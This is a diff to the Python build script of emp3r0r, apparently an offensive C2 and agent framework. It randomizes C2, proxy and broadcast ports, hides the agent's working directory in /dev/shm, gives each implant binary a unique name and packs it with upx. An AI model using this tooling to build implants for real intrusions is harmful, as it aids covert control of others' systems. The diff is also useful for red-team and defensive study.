@@ -6,9 +6,12 @@
 this script replaces build.sh, coz bash/sed/awk is driving me insane
 '''
 
+import atexit
 import glob
 import json
 import os
+import random
+import readline
 import shutil
 import sys
 import traceback
@@ -46,7 +49,7 @@ class GoBuild:
         if "agent_root" in CACHED_CONF:
             self.AgentRoot = CACHED_CONF['agent_root']
         else:
-            self.AgentRoot = f"/dev/shm/.../{uuid.uuid4()}"
+            self.AgentRoot = f"/dev/shm/.{uuid.uuid4()}"
             CACHED_CONF['agent_root'] = self.AgentRoot
 
     def build(self):
@@ -81,15 +84,15 @@ class GoBuild:
         # cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH}''' + \
         # f''' go build -ldflags='-s -w -extldflags "-static"' -o ../../build/{self.target}'''
         cmd = f'''GOOS={self.GOOS} GOARCH={self.GOARCH} CGO_ENABLED=0''' + \
-            f''' go build -ldflags='-s -w' -o ../../build/{self.target}'''
+            f''' go build -ldflags='-s -w' -o ../../build/{self.target}-{self.UUID}'''
         os.system(cmd)
         log_warn("GO BUILD ends...")
 
         os.chdir("../../")
         self.unset_tags()
 
-        if os.path.exists(f"./build/{self.target}"):
-            os.system(f"upx -9 ./build/{self.target}")
+        if os.path.exists(f"./build/{self.target}-{self.UUID}"):
+            os.system(f"upx -9 ./build/{self.target}-{self.UUID}")
         else:
             log_error("go build failed")
             sys.exit(1)
@@ -133,6 +136,13 @@ class GoBuild:
         # in case we use the same IP for indicator and CC
         sed("./internal/agent/def.go", self.CCIP, "[cc_ipaddr]")
         sed("./internal/agent/def.go", self.UUID, "[agent_uuid]")
+        # restore ports
+        sed("./internal/agent/def.go",
+            f"CCPort = \"{CACHED_CONF['cc_port']}\"", "CCPort = \"[cc_port]\"")
+        sed("./internal/agent/def.go",
+            f"ProxyPort = \"{CACHED_CONF['proxy_port']}\"", "ProxyPort = \"[proxy_port]\"")
+        sed("./internal/agent/def.go",
+            f"BroadcastPort = \"{CACHED_CONF['broadcast_port']}\"", "BroadcastPort = \"[broadcast_port]\"")
 
     def set_tags(self):
         '''
@@ -146,6 +156,12 @@ class GoBuild:
 
         sed("./internal/tun/tls.go", "[emp3r0r_ca]", self.CA)
         sed("./internal/agent/def.go", "[cc_ipaddr]", self.CCIP)
+        sed("./internal/agent/def.go",
+            "[cc_port]", CACHED_CONF['cc_port'])
+        sed("./internal/agent/def.go",
+            "[proxy_port]", CACHED_CONF['proxy_port'])
+        sed("./internal/agent/def.go",
+            "[broadcast_port]", CACHED_CONF['broadcast_port'])
         sed("./internal/agent/def.go", "[agent_root]", self.AgentRoot)
         sed("./internal/agent/def.go", "[cc_indicator]", self.INDICATOR)
         sed("./internal/agent/def.go", "[agent_uuid]", self.UUID)
@@ -188,6 +204,10 @@ def yes_no(prompt):
     '''
     y/n?
     '''
+    if yes_to_all:
+        log_warn(f"Choosing 'yes' for '{prompt}'")
+        return True
+
     answ = input(prompt + " [Y/n] ").lower().strip()
 
     if answ in ["n", "no", "nah", "nay"]:
@@ -262,28 +282,76 @@ def log_error(msg):
 
 def log_warn(msg):
     '''
-    print in red
+    print in yellow
     '''
     print("\u001b[33m"+msg+"\u001b[0m")
+
+
+def save(prev_h_len, hfile):
+    '''
+    append to histfile
+    '''
+    new_h_len = readline.get_current_history_length()
+    readline.set_history_length(1000)
+    readline.append_history_file(new_h_len - prev_h_len, hfile)
 
 
 # JSON config file, cache some user data
 BUILD_JSON = "./build/build.json"
 CACHED_CONF = {}
-try:
-    jsonf = open(BUILD_JSON)
-    CACHED_CONF = json.load(jsonf)
-    jsonf.close()
-except BaseException:
-    log_warn(traceback.format_exc())
+if os.path.exists(BUILD_JSON):
+    try:
+        jsonf = open(BUILD_JSON)
+        CACHED_CONF = json.load(jsonf)
+        jsonf.close()
+    except BaseException:
+        log_warn(traceback.format_exc())
 
 
-if len(sys.argv) != 2:
-    print(f"python3 {sys.argv[0]} [cc/agent]")
+def rand_port():
+    '''
+    returns a random int between 1024 and 65535
+    '''
+    return str(random.randint(1025, 65534))
+
+
+def randomize_ports():
+    '''
+    randomize every port used by emp3r0r agent,
+    cache them in build.json
+    '''
+    if 'cc_port' not in CACHED_CONF:
+        CACHED_CONF['cc_port'] = rand_port()
+    if 'proxy_port' not in CACHED_CONF:
+        CACHED_CONF['proxy_port'] = rand_port()
+    if 'broadcast_port' not in CACHED_CONF:
+        CACHED_CONF['broadcast_port'] = rand_port()
+
+
+# command line args
+yes_to_all = False
+if len(sys.argv) < 2:
+    print(f"python3 {sys.argv[0]} cc/agent [-y]")
     sys.exit(1)
+elif len(sys.argv) == 3:
+    # if `-y` is specified, no questions will be asked
+    yes_to_all = sys.argv[2] == "-y"
+
 try:
+    randomize_ports()
     if not os.path.exists("./build"):
         os.mkdir("./build")
+
+    # support GNU readline interface, command history
+    histfile = "./build/.build_py_history"
+    try:
+        readline.read_history_file(histfile)
+        h_len = readline.get_current_history_length()
+    except FileNotFoundError:
+        open(histfile, 'wb').close()
+        h_len = 0
+    atexit.register(save, h_len, histfile)
+
     main(sys.argv[1])
 except (KeyboardInterrupt, EOFError, SystemExit):
     sys.exit(0)
